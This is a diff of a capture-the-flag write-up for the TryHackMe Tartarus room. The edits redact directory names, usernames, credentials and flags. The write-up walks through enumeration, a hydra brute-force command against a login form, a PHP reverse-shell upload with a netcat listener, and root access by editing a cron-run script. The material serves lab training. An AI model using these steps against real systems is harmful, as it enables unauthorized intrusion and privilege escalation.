@@ -1,3 +1,5 @@
+<a href="https://tryhackme.com/room/tartaraus"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>
+
 # tartarus CTF
 
 ## nmap
@@ -94,9 +96,9 @@ Let us see what can be picked up here.
 nikto has highlighted a robots .txt, so lets have a look.
 ```
 User-Agent: *
-Disallow : /admin-dir
+Disallow : /--------
 
-I told d4rckh we should hide our things deep.
+I told ------- we should hide our things deep.
 ```
 From this we can possibly draw two conclusions, firstly, we have a username and secondly, we have a hidden directory. Lets look at the website as a whole, and in the meantime set off gobuster again on the new folder. No point in not checking, especially with the comment "hide our things deep"
 ```
@@ -110,19 +112,18 @@ Lets quickly start at the front door and check out the HTTP website/page. One th
 
 It looks like it is a default Apache Ubuntu holding page.  I read through it but find nothing that jumps out directly.
 
-So what about the /admin-dir?
+So what about the /-------?
 
 This gives us two additional files:
 ```
-Index of /admin-dir
+Index of /-------
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	- 	 
-[TXT]	credentials.txt	2020-07-05 21:45 	760 	 
-[ ]	userid	2020-07-05 21:45 	78 	 
+[TXT]	-------.txt	2020-07-05 21:45 	760 	 
+[ ]	-------	2020-07-05 21:45 	78 	 
 Apache/2.4.18 (Ubuntu) Server at 10.10.75.241 Port 80
 ```
 The userid file contains 13 user names
-
 ```
 usernames
 ```
@@ -234,12 +235,12 @@ ftp> cd ...
 ftp> ls
 227 Entering Passive Mode (10,10,218,247,222,171).
 150 Here comes the directory listing.
--rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 --------------.txt
 226 Directory send OK.
-ftp> get yougotgoodeyes.txt 
-local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
+ftp> get ------------.txt 
+local: -----------.txt remote: --------------.txt
 227 Entering Passive Mode (10,10,218,247,88,108).
-150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
+150 Opening BINARY mode data connection for -------------.txt (14 bytes).
 226 Transfer complete.
 14 bytes received in 0.00 secs (41.4299 kB/s)
 ftp> exit
@@ -255,19 +256,21 @@ vsftpd test file
 The second file is more forthcoming.
 ```
 ~/CTF/tryhackme/tartarus$ cat yougotgoodeyes.txt 
-/sUp3r-s3cr3t
+/---------
 ```
-Now we have what looks like a new folder. Insert login.png here.
+Now we have what looks like a new folder.
+
+![](/images/tartarus_login.png)
 
 So we have a login form with a set of usernames and passwords. Lets use hydra again and see what we come up with. In the meantime, I ran a gobuster script for the hidden folder:
 
 ```
-~/CTF/tryhackme/tartarus$ gobuster dir -u 10.10.218.247/sUp3r-s3cr3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+~/CTF/tryhackme/tartarus$ gobuster dir -u 10.10.218.247/------------ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-[+] Url:            http://10.10.218.247/sUp3r-s3cr3t
+[+] Url:            http://10.10.218.247/------------
 [+] Threads:        10
 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 [+] Status codes:   200,204,301,302,307,401,403
@@ -288,14 +291,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 OK so some more folders and also the authentication.php that we were aware of.
 
 ```
-~/CTF/tryhackme/tartarus$ hydra -L users.txt -P passwords.txt 10.10.218.247 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*"
+~/CTF/tryhackme/tartarus$ hydra -L users.txt -P passwords.txt 10.10.218.247 http-post-form "/------------/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*"
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-15 11:41:02
 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 1313 login tries (l:13/p:101), ~83 tries per task
-[DATA] attacking http-post-form://10.10.218.247:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*
-[80][http-post-form] host: 10.10.218.247   login: enox   password: P@ssword1234
+[DATA] attacking http-post-form://10.10.218.247:80/------------/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*
+[80][http-post-form] host: 10.10.218.247   login: ----   password: ------------
 
 ```
 Two things that I had issues with here. I tend to copy and paste from my notes using Zim Wiki and so I added the hidden folder at the end of the ip address rather in the form area, but also the initial results I got still gave me wrong passwords (right user) so I just used an asterix to indicate all as in either password and or username.
@@ -306,11 +309,11 @@ Lets see what they can allow us to do.
 
 Looks like we can add some files. Lets see if it will allow a php reverse shell exploit. (I use the one from pentestmonkey)
 
-insert upload file here
+![](/images/tartarus_upload.png)
 
 Now we have successfully uploaded it and gobuster has now given us the images folder, we get some more information. When we view the folder called uploads and we can see two things.
 
-insert index image here
+![](/images/tartarus_index.png)
 
 I then set up a local netcat session on port 4567 and then clicked the exploit.php. This now opens a shell on the target host.
 ```
@@ -340,15 +343,15 @@ www-data@ubuntu-xenial:/$ cd /home
 cd /home
 www-data@ubuntu-xenial:/home$ ls
 ls
-cleanup  d4rckh  thirtytwo
-www-data@ubuntu-xenial:/home$ cd d4rckh	
-cd d4rckh
-www-data@ubuntu-xenial:/home/d4rckh$ ls
+c-----p  d----h  t-------o
+www-data@ubuntu-xenial:/home$ cd ------	
+cd ------
+www-data@ubuntu-xenial:/home/------$ ls
 ls
 cleanup.py  user.txt
 www-data@ubuntu-xenial:/home/d4rckh$ cat user.txt
 cat user.txt
-0f7dbb2243e692e3ad222bc4eff8521f
+<insert user flag here>
 ```
 That is the user flag sorted. What about the admin?
 
@@ -358,26 +361,26 @@ Lets look around still:
 www-data@ubuntu-xenial:/home$ ls -lAh
 ls -lAh
 total 12K
-drwxr-xr-x 2 root      root      4.0K Jul  5 21:35 cleanup
-drwxr-xr-x 2 d4rckh    d4rckh    4.0K Jul  5 21:35 d4rckh
-drwxr-xr-x 2 thirtytwo thirtytwo 4.0K Jul  5 21:38 thirtytwo
+drwxr-xr-x 2 root      root      4.0K Jul  5 21:35 -------
+drwxr-xr-x 2 ------    ------    4.0K Jul  5 21:35 ------
+drwxr-xr-x 2 --------- --------- 4.0K Jul  5 21:38 --------
 www-data@ubuntu-xenial:/home$ ls -lAh *
 ls -lAh *
-cleanup:
+-------:
 total 0
 
-d4rckh:
+------:
 total 8.0K
 -rwxrwxrwx 1 root   root   129 Jul  5 21:45 cleanup.py
 -rw-r--r-- 1 d4rckh d4rckh  33 Jul  5 21:45 user.txt
 
-thirtytwo:
+---------:
 total 8.0K
 -rw------- 1 1002 1002  56 Jul  5 21:39 .bash_history
 -rwxr-xr-x 1 root root 143 Jul  5 21:45 note.txt
 
 www-data@ubuntu-xenial:/home$ cd thirtytwo
-cd thirtytwo
+cd ---------
 www-data@ubuntu-xenial:/home/thirtytwo$ ls
 ls
 note.txt
@@ -386,11 +389,11 @@ cat note.txt
 Hey 32, the other day you were unable to clone my github repository. 
 Now you can use git. Took a while to fix it but now its good :)
 
-~D4rckh
+~------
 ```
 OK we have another text file and what appears to be a python script:
 ```
-www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
+www-data@ubuntu-xenial:/home/-----$ cat cleanup.py 
 # -*- coding: utf-8 -*-
 #!/usr/bin/env python
 import os
@@ -404,7 +407,7 @@ except:
 
 Does this run automatically or when selected. If I can I tend to view crontab earlier than later as it at least gives me an idea of anything that is running.
 ```
-www-data@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
+www-data@ubuntu-xenial:/home/------$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -415,7 +418,7 @@ SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 # m h dom mon dow user	command
-*/2 *   * * *   root    python /home/d4rckh/cleanup.py
+*/2 *   * * *   root    python /home/------/cleanup.py
 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
@@ -424,15 +427,15 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 So we see that this file is running frequently and as root. If we look at out current permissions on the file, we can read, write and execute. So we could actually change the command on the inside? Before that lets check out what we can actually do with a sudo -l
 ```
-www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
+www-data@ubuntu-xenial:/home/------$ sudo -l
 Matching Defaults entries for www-data on ubuntu-xenial:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on ubuntu-xenial:
-    (thirtytwo) NOPASSWD: /var/www/gdb
+    (------) NOPASSWD: /var/www/gdb
 ```
-Right, so we can as thirtytwo run Gnome De-Bugging. My next port of call will be the [GTFOBINS](https://gtfobins.github.io/) to check out gdb and what it can do for us. However, I keep being drawn back to the file I should be able to amend as www-data.
+Right, so we can as --------- run Gnome De-Bugging. My next port of call will be the [GTFOBINS](https://gtfobins.github.io/) to check out gdb and what it can do for us. However, I keep being drawn back to the file I should be able to amend as www-data.
 
 Using vim, nano wasn't available, I amended the file to get the root flag, from where I expected it to be - /root/root.txt
 ```
@@ -451,11 +454,11 @@ except:
 ```
 After a few moments, I changed to /tmp and found the file I needed.
 ```
-www-data@ubuntu-xenial:/home/d4rckh$ cd /tmp/
+www-data@ubuntu-xenial:/home/------$ cd /tmp/
 www-data@ubuntu-xenial:/tmp$ ls
 root.txt
 www-data@ubuntu-xenial:/tmp$ cat root.txt 
-7e055812184a5fa5109d5db5c7eda7cd
+<insert root flag here>
 www-data@ubuntu-xenial:/tmp$ 
 ```
 Now to be honest, I really liked this room. I spend a good few hours going down different avenues. The image file that had a dBase III DBT file within it, I couldn't view. The trials and tribulations of moving between users by following GTFObins gdb commands, was all part of lifes rich tapestry!!.
@@ -465,3 +468,5 @@ When I am a bit more confident in these other tools, I will definately come back
 Thanks csenox :)
 
 K
+
+![](/images/Karti.png)
